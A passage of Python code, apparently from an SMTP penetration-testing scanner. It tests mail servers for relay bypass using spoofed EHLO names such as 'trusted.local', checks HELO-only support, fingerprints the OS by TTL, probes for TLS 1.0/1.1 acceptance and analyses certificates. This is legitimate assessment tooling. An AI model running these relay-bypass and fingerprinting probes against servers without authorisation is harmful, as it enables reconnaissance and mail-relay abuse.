            bad = vuln_tests[0] if vuln_tests else None
            vt = getattr(bad, "vuln_type", None) if bad else None
            cmd = bad.command_display if bad else "unknown"
            if vt == "acceptance":
                detail = f"Server accepted invalid input '{cmd}' (2xx response)"
            elif vt == "timeout":
                detail = f"No response (timeout) for '{cmd}'"
            else:
                detail = f"Server stopped responding after '{cmd}'"
        elif weakness:
            parts = []
            if slow_tests and not tarpitting_detected:
                parts.append("Slow response on long input (possible ReDoS in parser)")
            if any(self._inv_comm_info_leak(t.reply) for t in tests if t.reply):
                parts.append("Verbose error messages detected")
            detail = "Server handles invalid commands gracefully; " + "; ".join(parts) if parts else "Server handles invalid commands gracefully"
        else:
            detail = "Server handles invalid commands securely"

        if tarpitting_detected:
            detail = (detail + ". INFO: Tarpitting detected (constant delay on invalid commands - likely smtpd_error_sleep_time, not parser bug)")

        return InvCommResult(
            vulnerable=vulnerable,
            weakness=weakness,
            indeterminate=indeterminate,
            tests=tuple(tests),
            detail=detail,
            baseline_latency_sec=baseline_latency_sec,
            tarpitting_detected=tarpitting_detected,
        )

    def test_helo_only(self) -> HeloOnlyResult:
        """
        Test if server supports EHLO extensions or only basic HELO (PTL-SVC-SMTP-HELOONLY).
        Uses same hostname for both HELO and EHLO to avoid false positives from firewalls/antispam
        that may drop EHLO when they dislike the client IP or hostname.
        """
        host = self.args.target.ip
        port = self.args.target.port
        timeout = 10.0
        helo_host = "test.local"  # Same for both HELO and EHLO - eliminates variable
        _ssl_ctx = ssl._create_unverified_context()
        use_tls = self.args.tls or port == 465
        use_starttls = self.args.starttls and not use_tls
        conn_type = "tls" if use_tls else "starttls" if use_starttls else "plain"

        def _connect_helo_only():
            if use_tls:
                try:
                    _is_ip = ipaddress.ip_address(host)
                    _sni = None
                except ValueError:
                    _sni = host
                sock = socket.create_connection((host, port), timeout=timeout)
                sock_ssl = _ssl_ctx.wrap_socket(sock, server_hostname=_sni)
                smtp = smtplib.SMTP(timeout=timeout)
                smtp.sock = sock_ssl
                smtp.file = None
                status, _ = smtp.getreply()
                return smtp, status
            smtp = smtplib.SMTP(timeout=timeout)
            status, _ = smtp.connect(host, port)
            if status != 220:
                return smtp, status
            if use_starttls:
                status_stls, _ = smtp.docmd("STARTTLS")
                if status_stls != 220:
                    return smtp, status_stls
                try:
                    _is_ip = ipaddress.ip_address(host)
                    _sni = None
                except ValueError:
                    _sni = host
                sock_ssl = _ssl_ctx.wrap_socket(smtp.sock, server_hostname=_sni)
                smtp.sock = sock_ssl
                smtp.file = None
                smtp.helo_resp = None
                smtp.ehlo_resp = None
                smtp.esmtp_features = {}
                smtp.does_esmtp = False
            return smtp, 220

        try:
            smtp1, conn_status = _connect_helo_only()
            if conn_status != 220:
                try:
                    smtp1.close()
                except Exception:
                    pass
                if conn_status in (421, 451):
                    return HeloOnlyResult(
                        vulnerable=False,
                        indeterminate=True,
                        helo_status=None,
                        helo_reply=None,
                        ehlo_status=None,
                        ehlo_reply=None,
                        extensions=(),
                        connection_type=conn_type,
                        detail="Rate limiting (421/451) - indeterminate",
                    )
                return HeloOnlyResult(
                    vulnerable=False,
                    indeterminate=True,
                    helo_status=None,
                    helo_reply=None,
                    ehlo_status=None,
                    ehlo_reply=None,
                    extensions=(),
                    connection_type=conn_type,
                    detail=f"Connection/banner failed: {conn_status}",
                )

            helo_status, helo_reply_bytes = smtp1.docmd("HELO", helo_host)
            helo_reply = helo_reply_bytes.decode(errors="replace") if helo_reply_bytes else None
            try:
                smtp1.quit()
            except Exception:
                pass

            time.sleep(1)

            smtp2, conn_status2 = _connect_helo_only()
            if conn_status2 != 220:
                try:
                    smtp2.close()
                except Exception:
                    pass
                return HeloOnlyResult(
                    vulnerable=False,
                    indeterminate=True,
                    helo_status=helo_status,
                    helo_reply=helo_reply,
                    ehlo_status=None,
                    ehlo_reply=None,
                    extensions=(),
                    connection_type=conn_type,
                    detail="Reconnect failed - indeterminate",
                )

            ehlo_status, ehlo_reply_bytes = smtp2.ehlo(helo_host)
            ehlo_reply = ehlo_reply_bytes.decode(errors="replace") if ehlo_reply_bytes else None

            # Use smtplib's parsed esmtp_features (reliable) - extract before quit()
            extensions_list: list[str] = []
            if getattr(smtp2, "esmtp_features", None):
                for key, value in smtp2.esmtp_features.items():
                    key_upper = (key or "").upper().strip()
                    if not key_upper or key_upper == "OK":
                        continue
                    if "." in key_upper and key_upper not in SMTP_KNOWN_EXTENSIONS:
                        continue
                    if value:
                        extensions_list.append(f"{key_upper} {value.strip()}".strip())
                    else:
                        extensions_list.append(key_upper)
            extensions = tuple(extensions_list)

            try:
                smtp2.quit()
            except Exception:
                pass

            if ehlo_status in (421, 451):
                return HeloOnlyResult(
                    vulnerable=False,
                    indeterminate=True,
                    helo_status=helo_status,
                    helo_reply=helo_reply,
                    ehlo_status=ehlo_status,
                    ehlo_reply=ehlo_reply,
                    extensions=(),
                    connection_type=conn_type,
                    detail="Rate limiting on EHLO (421/451) - indeterminate",
                )

            # At least one extension = NOT vulnerable. No extensions or EHLO rejected = vulnerable.
            if ehlo_status == 250 and len(extensions) > 0:
                vulnerable = False
                detail = "Not Vulnerable: Server supports ESMTP extensions."
            else:
                vulnerable = True
                detail = "Server supports only HELO; EHLO rejected or provides no ESMTP extensions."

            return HeloOnlyResult(
                vulnerable=vulnerable,
                indeterminate=False,
                helo_status=helo_status,
                helo_reply=helo_reply,
                ehlo_status=ehlo_status,
                ehlo_reply=ehlo_reply,
                extensions=extensions,
                connection_type=conn_type,
                detail=detail,
            )

        except (socket.timeout, ConnectionRefusedError, OSError) as e:
            return HeloOnlyResult(
                vulnerable=False,
                indeterminate=True,
                helo_status=None,
                helo_reply=None,
                ehlo_status=None,
                ehlo_reply=None,
                extensions=(),
                connection_type=conn_type,
                detail=str(e),
            )

    def test_helo_bypass(self) -> HeloBypassResult:
        """
        Test HELO/EHLO value for bypassing security restrictions (PTL-SVC-SMTP-HELO).
        Each attempt is isolated (new connection) so previous AUTH or EHLO cannot affect state.
        """
        host = self.args.target.ip
        port = self.args.target.port
        timeout = 15.0
        _ssl_ctx = ssl._create_unverified_context()
        use_tls = self.args.tls or port == 465
        use_starttls = self.args.starttls and not use_tls

        def _connect_helo_bypass() -> tuple[smtplib.SMTP | smtplib.SMTP_SSL, int]:
            """New connection for each payload - isolated state. Returns (smtp, status)."""
            try:
                if use_tls:
                    try:
                        _is_ip = ipaddress.ip_address(host)
                        _sni = None
                    except ValueError:
                        _sni = host
                    sock = socket.create_connection((host, port), timeout=timeout)
                    sock_ssl = _ssl_ctx.wrap_socket(sock, server_hostname=_sni)
                    smtp = smtplib.SMTP(timeout=timeout)
                    smtp.sock = sock_ssl
                    smtp.file = None
                    status, _ = smtp.getreply()
                    return smtp, status
                smtp = smtplib.SMTP(timeout=timeout)
                status, _ = smtp.connect(host, port)
                if status != 220:
                    return smtp, status
                if use_starttls:
                    status_stls, _ = smtp.docmd("STARTTLS")
                    if status_stls != 220:
                        return smtp, status_stls
                    try:
                        _is_ip = ipaddress.ip_address(host)
                        _sni = None
                    except ValueError:
                        _sni = host
                    sock_ssl = _ssl_ctx.wrap_socket(smtp.sock, server_hostname=_sni)
                    smtp.sock = sock_ssl
                    smtp.file = None
                    smtp.helo_resp = None
                    smtp.ehlo_resp = None
                    smtp.esmtp_features = {}
                    smtp.does_esmtp = False
                return smtp, 220
            except (socket.timeout, ConnectionRefusedError, OSError):
                raise

        def _build_infra_payloads(domain: str | None) -> list[str]:
            """Build Infrastructure payloads from target domain."""
            if not domain or "." not in domain:
                return []
            domain_lower = domain.lower().strip()
            # Dedupe and avoid empty/invalid
            candidates = [
                domain_lower,
                f"mail.{domain_lower}" if not domain_lower.startswith("mail.") else None,
                f"mx1.{domain_lower}",
                f"mx2.{domain_lower}",
                f"vpn.{domain_lower}",
                f"remote.{domain_lower}",
                f"office.{domain_lower}",
            ]
            seen: set[str] = set()
            result: list[str] = []
            for c in candidates:
                if c and c not in seen and _is_valid_hostname(c):
                    seen.add(c)
                    result.append(c)
            return result

        # Payload groups
        EHLO_GENERIC = ["test", "localhost", "127.0.0.1"]
        EHLO_EXTERNAL = ["gmail.com", "outlook.com"]
        EHLO_DNS = ["nonexistent.invalid"]  # RFC 6761: .invalid never resolves; tests DNS validation
        EHLO_INTERNAL = ["trusted.local", "internal.local", "exchange.local"]

        submission_bypass: list[str] = []
        relay_bypass: list[str] = []
        accepts_invalid: list[str] = []
        tarpitting_list: list[str] = []
        ehlo_comparison: dict = {}
        rcpt_latencies: dict[str, float] = {}

        # Get target domain for Infrastructure payloads (one preliminary connect)
        infra_payloads: list[str] = []
        try:
            smtp_probe, conn_status = _connect_helo_bypass()
            if conn_status == 220:
                _, reply_bytes = smtp_probe.docmd("EHLO", "test")
                reply_str = reply_bytes.decode(errors="replace") if reply_bytes else ""
                server_hostname = _get_hostname_from_ehlo_raw(reply_str)
                if server_hostname:
                    reg_domain = _registrable_domain_psl(server_hostname) or server_hostname
                    infra_payloads = _build_infra_payloads(reg_domain)
                    if server_hostname not in infra_payloads and _is_valid_hostname(server_hostname):
                        infra_payloads.insert(0, server_hostname)
                try:
                    smtp_probe.quit()
                except Exception:
                    pass
        except Exception:
            pass

        all_payloads = EHLO_GENERIC + EHLO_EXTERNAL + EHLO_DNS + infra_payloads + EHLO_INTERNAL
        # Dedupe preserving order
        seen_payloads: set[str] = set()
        unique_payloads: list[str] = []
        for p in all_payloads:
            if p not in seen_payloads:
                seen_payloads.add(p)
                unique_payloads.append(p)

        # Role: port-based hint (MTA vs Submission)
        port_hint = "submission" if port in (587, 465, 2525) else "mta"
        rcpt_external = "external-test@gmail.com"

        for helo_value in unique_payloads:
            smtp = None
            try:
                smtp, conn_status = _connect_helo_bypass()
                if conn_status != 220:
                    if conn_status in (421, 451):
                        return HeloBypassResult(
                            vulnerable=False,
                            indeterminate=True,
                            submission_bypass_ehlo=(),
                            relay_bypass_ehlo=(),
                            accepts_invalid_format=tuple(accepts_invalid),
                            ehlo_consistent=len(set(frozenset(e.get("extensions", [])) for e in ehlo_comparison.values())) <= 1,
                            ehlo_comparison=ehlo_comparison,
                            tarpitting_detected=tuple(tarpitting_list),
                            rcpt_latencies=rcpt_latencies,
                            detail="Rate limiting (421/451) - indeterminate",
                        )
                    continue
            except (socket.timeout, ConnectionRefusedError, OSError) as e:
                return HeloBypassResult(
                    vulnerable=False,
                    indeterminate=True,
                    submission_bypass_ehlo=(),
                    relay_bypass_ehlo=(),
                    accepts_invalid_format=tuple(accepts_invalid),
                    ehlo_consistent=True,
                    ehlo_comparison=ehlo_comparison,
                    tarpitting_detected=tuple(tarpitting_list),
                    rcpt_latencies=rcpt_latencies,
                    detail=str(e),
                )

            try:
                # 1. EHLO <payload>
                ehlo_status, ehlo_reply_bytes = smtp.docmd("EHLO", helo_value)
                ehlo_reply_str = ehlo_reply_bytes.decode(errors="replace") if ehlo_reply_bytes else ""
                extensions = _get_ehlo_extension_keys(ehlo_reply_str)
                ehlo_comparison[helo_value] = {"status": ehlo_status, "extensions": extensions}

                if ehlo_status == 250:
                    accepts_invalid.append(helo_value)

                if ehlo_status != 250:
                    smtp.quit()
                    continue

                # 2. MAIL FROM – measure latency for every payload (auth check may reject here)
                start = time.monotonic()
                mail_status, _ = smtp.docmd("MAIL", "FROM:<tester@example.com>")
                mail_latency = time.monotonic() - start

                if mail_status not in (250, 251):
                    rcpt_latencies[helo_value] = mail_latency  # Store MAIL latency when rejected here
                    if mail_latency > 5.0:
                        tarpitting_list.append(helo_value)
                    smtp.quit()
                    continue

                # 3. RCPT TO – measure latency
                start = time.monotonic()
                rcpt_status, _ = smtp.docmd("RCPT", f"TO:<{rcpt_external}>")
                rcpt_latency = time.monotonic() - start
                rcpt_latencies[helo_value] = rcpt_latency

                if rcpt_latency > 5.0:
                    tarpitting_list.append(helo_value)

                # 4. Evaluate: 250=CRITICAL, 530=CORRECT, 550/554=REJECTED
                if rcpt_status in (250, 251):
                    if port_hint == "submission":
                        submission_bypass.append(helo_value)
                    else:
                        relay_bypass.append(helo_value)
            except (smtplib.SMTPServerDisconnected, ConnectionResetError, OSError):
                pass
            finally:
                if smtp:
                    try:
                        smtp.quit()
                    except Exception:
                        try:
                            smtp.close()
                        except Exception:
                            pass

        # Compute ehlo_consistent
        ext_sets = [tuple(e.get("extensions", [])) for e in ehlo_comparison.values()]
        ehlo_consistent = len(set(ext_sets)) <= 1 if ext_sets else True

        vulnerable = bool(submission_bypass or relay_bypass)
        detail_parts = []
        if submission_bypass:
            detail_parts.append(f"Submission bypass with EHLO: {', '.join(submission_bypass)}")
        if relay_bypass:
            detail_parts.append(f"Relay bypass with EHLO: {', '.join(relay_bypass)}")
        if accepts_invalid:
            detail_parts.append(f"Accepts invalid format: {', '.join(accepts_invalid)}")
        if tarpitting_list:
            detail_parts.append(f"Tarpitting detected for: {', '.join(tarpitting_list)}")
        if not detail_parts:
            detail_parts.append("No relay bypass detected (Authorization required)")

        return HeloBypassResult(
            vulnerable=vulnerable,
            indeterminate=False,
            submission_bypass_ehlo=tuple(submission_bypass),
            relay_bypass_ehlo=tuple(relay_bypass),
            accepts_invalid_format=tuple(accepts_invalid),
            ehlo_consistent=ehlo_consistent,
            ehlo_comparison=ehlo_comparison,
            tarpitting_detected=tuple(tarpitting_list),
            rcpt_latencies=rcpt_latencies,
            detail="; ".join(detail_parts),
        )

    def _probe_ttl_os_hint(self, host: str, port: int) -> str | None:
        """Passive OS fingerprinting via TTL. Infers original TTL (32/64/128/255) from received value."""
        def _ttl_to_hint(received_ttl: int) -> str:
            # Standard initial TTLs (32, 64, 128, 255). Infer original by nearest higher value.
            # TTL 30–32: Virtuozzo/OpenVZ containers (v1.0.5).
            # Received TTL 33–64 → original 64 (Linux/Unix) ~99% confidence.
            if 30 <= received_ttl <= 32:
                return f"Likely Linux Container (TTL {received_ttl}, Low TTL)"
            STANDARD_TTL = (64, 128, 255)  # 32 omitted – rare for SMTP
            if received_ttl < 33:
                return f"Unknown (TTL {received_ttl}, too few hops to infer)"
            original = 255
            for s in STANDARD_TTL:
                if received_ttl <= s:
                    original = s
                    break
            if original == 64:
                return f"Likely Linux/Unix (TTL {received_ttl}, inferred 64)"
            if original == 128:
                return f"Likely Windows (TTL {received_ttl}, inferred 128)"
            return f"Likely Cisco/network appliance (TTL {received_ttl}, inferred 255)"

        def _ping_ttl_fallback(targ: str) -> int | None:
            """Fallback: run ping -c 1 and parse TTL from output. Works when IP_RECVTTL ancdata is empty (e.g. cloud LBs)."""
            try:
                proc = subprocess.run(
                    ["ping", "-c", "1", "-W", "3", targ],
                    capture_output=True,
                    timeout=5,
                    text=True,
                )
                if proc.returncode != 0:
                    return None
                # Typical: "64 bytes from 153.92.246.223: icmp_seq=1 ttl=54 time=..."
                m = re.search(r"\bttl[= ](\d+)\b", proc.stdout or "", re.I)
                return int(m.group(1)) if m else None
            except (subprocess.SubprocessError, ValueError, OSError):
                return None

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5.0)
            try:
                # IP_RECVTTL = 12 on Linux; enables TTL in ancillary data
                sock.setsockopt(socket.IPPROTO_IP, 12, 1)
            except (OSError, TypeError) as e:
                if getattr(self.args, "debug", False):
                    self.ptdebug(f"TTL probe: setsockopt IP_RECVTTL failed ({e})", Out.INFO)
                return None
            sock.connect((host, port))
            try:
                data, ancdata, _flags, _addr = sock.recvmsg(4096, socket.CMSG_SPACE(16))
            except (OSError, AttributeError) as e:
                if getattr(self.args, "debug", False):
                    self.ptdebug(f"TTL probe: recvmsg failed ({e})", Out.INFO)
                return None
            finally:
                try:
                    sock.close()
                except Exception:
                    pass
            ttl = None
            for cmsg_level, cmsg_type, cmsg_data in ancdata:
                if cmsg_level == socket.IPPROTO_IP and cmsg_type == 12 and cmsg_data:
                    try:
                        ttl = int(cmsg_data[0]) if len(cmsg_data) >= 1 else None
                    except (TypeError, IndexError, ValueError):
                        pass
                    if ttl is not None:
                        break
            if ttl is None and getattr(self.args, "debug", False):
                self.ptdebug(
                    f"TTL probe: no TTL in ancdata (len={len(ancdata)}); cmsgs={[(c[0],c[1],bool(c[2])) for c in ancdata]}",
                    Out.INFO,
                )
            if ttl is None:
                ttl = _ping_ttl_fallback(host)
                if ttl is not None and getattr(self.args, "debug", False):
                    self.ptdebug(f"TTL probe: fallback ping returned TTL={ttl}", Out.INFO)
            if ttl is None:
                return None
            return _ttl_to_hint(ttl)
        except Exception as e:
            if getattr(self.args, "debug", False):
                self.ptdebug(f"TTL probe: exception {e}", Out.INFO)
            return None

    def _probe_tls_downgrade(
        self, host: str, port: int, use_implicit_tls: bool, sni_host: str | None
    ) -> list[str]:
        """Phase 2: Try weak TLS configs. Returns list of findings if server accepts."""
        findings: list[str] = []
        hostname = sni_host or host
        if not hostname or not hostname.strip():
            hostname = host
        connect_tls_direct = use_implicit_tls  # True = port 465 or --tls; False = STARTTLS

        def _try_ctx(name: str, ctx: ssl.SSLContext) -> None:
            sock = None
            try:
                sock = socket.create_connection((host, port), timeout=5.0)
                if connect_tls_direct:
                    sock_ssl = ctx.wrap_socket(sock, server_hostname=hostname)
                    sock_ssl.recv(1024)
                    findings.append(name)
                else:
                    # STARTTLS path: read 220, send EHLO, read 250, send STARTTLS, wrap
                    sock.recv(4096)
                    sock.sendall(b"EHLO probe.local\r\n")
                    sock.recv(4096)
                    sock.sendall(b"STARTTLS\r\n")
                    reply = sock.recv(4096).decode(errors="replace")
                    if "220" in reply or "Ready" in reply:
                        sock_ssl = ctx.wrap_socket(sock, server_hostname=hostname)
                        sock_ssl.recv(1024)
                        findings.append(name)
            except (ssl.SSLError, OSError, socket.timeout):
                pass
            finally:
                if sock:
                    try:
                        sock.close()
                    except Exception:
                        pass

        # TLS 1.0 only
        try:
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            ctx.options |= getattr(ssl, "OP_NO_TLSv1_1", 0) | getattr(ssl, "OP_NO_TLSv1_2", 0) | getattr(ssl, "OP_NO_TLSv1_3", 0)
            _try_ctx("Server accepts TLS 1.0", ctx)
        except Exception:
            pass

        # TLS 1.1 only
        try:
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            ctx.options |= getattr(ssl, "OP_NO_TLSv1", 0) | getattr(ssl, "OP_NO_TLSv1_2", 0) | getattr(ssl, "OP_NO_TLSv1_3", 0)
            _try_ctx("Server accepts TLS 1.1", ctx)
        except Exception:
            pass

        return findings

    def _extract_tls_cert_info(
        self, smtp: smtplib.SMTP | smtplib.SMTP_SSL
    ) -> tuple[str, str, list[str], bool, list[str], list[str]] | None:
        """Extract Subject, Issuer, SAN, is_self_signed, cert_warnings, cipher_warnings from peer cert.
        Uses getpeercert(binary_form=True) + cryptography when dict form is None (unverified context)."""
        sock = getattr(smtp, "sock", None)
        if not sock or not isinstance(sock, ssl.SSLSocket):
            return None

        def _analyze_cipher(s: ssl.SSLSocket) -> list[str]:
            """Analyze negotiated cipher/protocol. Returns warnings ordered by severity (CRITICAL, HIGH, MEDIUM, INFO)."""
            try:
                cipher_data = s.cipher()
                if not cipher_data or len(cipher_data) < 2:
                    return []
                cipher_name = str(cipher_data[0] or "").upper()
                protocol = str(cipher_data[1] or "").upper()
            except Exception:
                return []
            warnings: list[tuple[int, str]] = []  # (priority: 0=critical, 1=high, 2=medium, 3=info), text
            # CRITICAL: SSLv2, SSLv3
            if "SSLv2" in protocol or "SSLv3" in protocol:
                warnings.append((0, "CRITICAL: Protocol is ancient and insecure (POODLE, DROWN)."))
            # CRITICAL: RC4, MD5
            if "RC4" in cipher_name or "MD5" in cipher_name:
                warnings.append((0, "CRITICAL: Broken cryptographic primitives detected."))
            # CRITICAL: EXPORT
            if "EXPORT" in cipher_name:
                warnings.append((0, "CRITICAL: Artificially weakened legacy export cipher (Logjam)."))
            # MEDIUM: TLS 1.0, 1.1
            if protocol in ("TLSV1", "TLSV1.0", "TLSV1.1"):
                warnings.append((2, "MEDIUM: Protocol is deprecated. Upgrade to TLS 1.2 or 1.3."))
            # HIGH: 3DES, DES (DES-CBC3 = 3DES in OpenSSL naming)
            if "3DES" in cipher_name or "DES" in cipher_name:
                warnings.append((1, "HIGH: Small block size vulnerable to Sweet32 attack."))
            # INFO: CBC without AEAD (GCM/CHACHA20)
            if "CBC" in cipher_name and "GCM" not in cipher_name and "CHACHA20" not in cipher_name and "POLY1305" not in cipher_name:
                warnings.append((3, "INFO: Using legacy CBC mode. Consider AEAD (GCM/CHACHA20)."))
            warnings.sort(key=lambda x: x[0])
            return [w[1] for w in warnings]

        def _normalize_cert_text(text: str) -> str:
            """Lowercase and remove wildcard prefix (*.) for predictable matching."""
            if not text:
                return ""
            return text.lower().replace("*.", "")

        def _format_x509_name(x509_tuple: tuple | list) -> str:
            if not x509_tuple:
                return ""
            parts: list[str] = []
            oid_short = {"commonName": "CN", "organizationName": "O", "countryName": "C", "stateOrProvinceName": "ST", "localityName": "L"}
            for item in x509_tuple:
                if isinstance(item, (tuple, list)) and len(item) >= 1:
                    pair = item[0] if isinstance(item[0], (tuple, list)) else item
                    if isinstance(pair, (tuple, list)) and len(pair) >= 2:
                        name, value = str(pair[0]), str(pair[1])
                        short = oid_short.get(name, name)
                        parts.append(f"{short}={value}")
            return ", ".join(parts)

        def _analyze_cert(cert: "x509.Certificate | None") -> list[str]:
            if cert is None:
                return []
            warnings: list[str] = []
            try:
                if cert.signature_hash_algorithm is not None and cert.signature_hash_algorithm.name == "sha1":
                    warnings.append("SHA-1 signature (deprecated; prefer SHA-256)")
            except Exception:
                pass
            try:
                pubkey = cert.public_key()
                if isinstance(pubkey, rsa.RSAPublicKey) and pubkey.key_size < 2048:
                    warnings.append(f"RSA key {pubkey.key_size} bits (< 2048, weak)")
            except Exception:
                pass
            return warnings

        subject, issuer, san_list = "", "", []
        cert_obj = None
        cert_dict = None
        try:
            cert_dict = sock.getpeercert()
        except Exception:
            pass
        if cert_dict and isinstance(cert_dict, dict):
            subject = _format_x509_name(cert_dict.get("subject") or ())
            issuer = _format_x509_name(cert_dict.get("issuer") or ())
            for item in cert_dict.get("subjectAltName") or ():
                if not isinstance(item, (tuple, list)) or len(item) < 2:
                    continue
                kind = str(item[0]).upper().replace(" ", "")
                val = item[1]
                if kind == "DNS":
                    san_list.append(str(val))
                # rfc822Name: prefix so downstream does not treat local-part-only (e.g. postmaster) as dNSName
                elif kind in ("EMAIL", "RFC822", "RFC822NAME", "E-MAIL"):
                    san_list.append(f"RFC822:{str(val)}")
        elif _HAS_CRYPTOGRAPHY:
            try:
                cert_der = sock.getpeercert(binary_form=True)
                # Fallback: getpeercert(binary_form=True) can return None with CERT_NONE (Python bug #18293).
                # get_unverified_chain() (Python 3.10+) returns list of DER bytes – use first (peer cert).
                if not cert_der and hasattr(sock, "get_unverified_chain"):
                    try:
                        chain = sock.get_unverified_chain()
                        if chain and len(chain) > 0 and isinstance(chain[0], bytes):
                            cert_der = chain[0]
                    except Exception:
                        pass
                if cert_der:
                    cert_obj = x509.load_der_x509_certificate(cert_der)
                    subject = cert_obj.subject.rfc4514_string()
                    issuer = cert_obj.issuer.rfc4514_string()
                    try:
                        san_ext = cert_obj.extensions.get_extension_for_class(x509.SubjectAlternativeName)
                        san_list = []
                        for name in san_ext.value:
                            if isinstance(name, x509.DNSName):
                                san_list.append(name.value)
                            elif isinstance(name, x509.RFC822Name):
                                san_list.append(f"RFC822:{name.value}")
                            else:
                                v = getattr(name, "value", None)
                                if isinstance(v, str):
                                    san_list.append(v)
                    except x509.ExtensionNotFound:
                        pass
            except Exception as e:
                self.ptdebug(f"TLS cert extraction failed: {e}", Out.INFO)
                return None
        else:
            return None
        if not subject and not issuer and not san_list:
            return None
        subject = _normalize_cert_text(subject)
        issuer = _normalize_cert_text(issuer)
        san_list = [_normalize_cert_text(str(n)) for n in san_list]
        is_self_signed = bool(subject and issuer and subject.strip() == issuer.strip())
        cert_warnings: list[str] = _analyze_cert(cert_obj) if cert_obj else []
        # Self-signed status is reported once in identify output (icon + "Self-signed: yes"); do not duplicate in cert_warnings.
        cipher_warnings: list[str] = _analyze_cipher(sock)
        return (subject, issuer, san_list, is_self_signed, cert_warnings, cipher_warnings)

    def test_server_identify(self) -> ServerIdentifyResult:
        """
        Identify SMTP server software from banner, EHLO, HELP, TLS cert, and optionally aggressive probes.
        PTL-SVC-SMTP-IDENTIFY.
        """
        error_samples: list[str] = []
        unknown_cmd_response: str | None = None
        help_response: str | None = None
        ehlo_raw: str | None = None
        banner: str | None = None
        tls_cert_subject: str | None = None
        tls_cert_issuer: str | None = None
        tls_cert_san: list[str] = []
        tls_cert_self_signed: bool = False
        tls_cert_warnings: list[str] = []
        tls_cipher_warnings: list[str] = []
        tls_downgrade_findings: list[str] = []
        tls_downgrade_probed: bool = False
        os_hint: str | None = None
        tls_policy: str | None = "n/a"
        id_aggressive = getattr(self.args, "id_aggressive", False)

        try:
            host, port = self.args.target.ip, self.args.target.port
            os_hint = self._probe_ttl_os_hint(host, port)

            smtp, status, reply = self.connect()
            if status != 220:
                raise Exception(f"Connection failed: [{status}] {reply.decode(errors='replace')[:200]}")
            banner = reply.decode(errors="replace")

            # EHLO (use ehlo() not docmd so esmtp_features is populated for starttls())
            _, ehlo_bytes = smtp.ehlo(self.fqdn)
            if ehlo_bytes:
                ehlo_raw = ehlo_bytes.decode(errors="replace") if isinstance(ehlo_bytes, bytes) else str(ehlo_bytes or "")

            # TLS cert FIRST (right after EHLO): HELP returns multi-line 214 which can desync the
            # protocol buffer; doing STARTTLS before HELP avoids cert extraction failures (e.g. Zoho).
            # Use smtp.starttls() for correct 220 buffer handling (RFC 3207).
            # SNI (Server Name Indication): Zoho, Microsoft, Yandex require SNI in TLS handshake.
            # Priority: 1) user-supplied hostname (target), 2) EHLO first line, 3) banner 220, 4) PTR, 5) IP.
            tls_upgrade_attempted = False
            tls_upgrade_error: str | None = None  # Stored for -vv/--verbose when cert not extracted
            if not isinstance(getattr(smtp, "sock", None), ssl.SSLSocket) and ehlo_raw and re.search(r"starttls", ehlo_raw, re.I):
                tls_upgrade_attempted = True
                # Prefer user-supplied hostname (e.g. mx.zoho.eu) – most reliable for cloud providers
                try:
                    ipaddress.ip_address(self.args.target.ip)
                    target_is_ip = True
                except ValueError:
                    target_is_ip = False
                if not target_is_ip and _is_valid_hostname(self.args.target.ip):
                    sni_host = self.args.target.ip.lower().strip()
                else:
                    server_hostname = _get_hostname_from_ehlo_raw(ehlo_raw)
                    if not server_hostname and banner:
                        first_line = banner.split("\n")[0].split("\r")[0].strip()
                        m = re.match(r"^220\s+(\S+)", first_line)
                        if m and _is_valid_hostname(m.group(1)):
                            server_hostname = m.group(1).lower()
                    try:
                        _ = ipaddress.ip_address(self.args.target.ip)
                        sni_host = server_hostname
                        if not sni_host or not sni_host.strip() or sni_host.startswith("."):
                            try:
                                ptr_host, _, _ = socket.gethostbyaddr(self.args.target.ip)
                                if ptr_host and "." in ptr_host and _is_valid_hostname(ptr_host):
                                    sni_host = ptr_host.lower()
                            except (socket.herror, socket.gaierror, OSError):
                                pass
                        if not sni_host or not sni_host.strip() or sni_host.startswith("."):
                            sni_host = self.args.target.ip
                    except ValueError:
                        sni_host = self.args.target.ip
                # Manual wrap_socket with explicit server_hostname – Zoho/Microsoft/Yandex require SNI
                try:
                    status_stls, _ = smtp.docmd("STARTTLS")
                    if status_stls == 220:
                        ctx = ssl._create_unverified_context()
                        sock_ssl = ctx.wrap_socket(smtp.sock, server_hostname=sni_host)
                        smtp.sock = sock_ssl
                        smtp.file = None
                        smtp.helo_resp = None
                        smtp.ehlo_resp = None
                        smtp.esmtp_features = {}
                        smtp.does_esmtp = False
                except Exception as e:
                    tls_upgrade_error = str(e)
                    self.ptdebug(f"STARTTLS failed (cert not extracted): {e}", Out.INFO)

            cert_info = self._extract_tls_cert_info(smtp)
            if cert_info:
                tls_cert_subject, tls_cert_issuer, tls_cert_san, tls_cert_self_signed, tls_cert_warnings, tls_cipher_warnings = cert_info

            # HELP (after STARTTLS to avoid multi-line 214 desync; if on TLS, EHLO first per RFC 3207)
            if isinstance(getattr(smtp, "sock", None), ssl.SSLSocket):
                smtp.ehlo(self.fqdn)  # RFC 3207: must EHLO again after STARTTLS
            status_help, help_bytes = smtp.docmd("HELP")
            if status_help in (211, 214) and help_bytes:
                help_response = help_bytes.decode(errors="replace")

            # Opportunistic vs Mandatory TLS: MAIL FROM on plain (need fresh connection if we upgraded)
            if not isinstance(getattr(smtp, "sock", None), ssl.SSLSocket) and ehlo_raw and re.search(r"starttls", ehlo_raw, re.I):
                status_mail, mail_reply = smtp.docmd("MAIL FROM:<probe@probe.test>")
                reply_str = (mail_reply or b"").decode(errors="replace").upper()
                if status_mail == 530 and ("STARTTLS" in reply_str or "MUST ISSUE" in reply_str):
                    tls_policy = "mandatory"
                elif status_mail == 250:
                    tls_policy = "opportunistic"
                    smtp.docmd("RSET")
            elif isinstance(getattr(smtp, "sock", None), ssl.SSLSocket):
                # We upgraded; policy check skipped (would need fresh plain conn). Default to n/a.
                pass

            # Phase 2: TLS downgrade probe (whenever TLS was used; runs with -id and --id-aggressive)
            if cert_info is not None or self.args.tls or port == 465 or (ehlo_raw and re.search(r"starttls", ehlo_raw, re.I)):
                tls_downgrade_probed = True
                sni_host = _get_hostname_from_ehlo_raw(ehlo_raw) if ehlo_raw else None
                if not sni_host and banner:
                    m = re.match(r"^220\s+(\S+)", (banner.split("\n")[0] if banner else ""))
                    if m and _is_valid_hostname(m.group(1)):
                        sni_host = m.group(1).lower()
                use_implicit = bool(self.args.tls or port == 465)
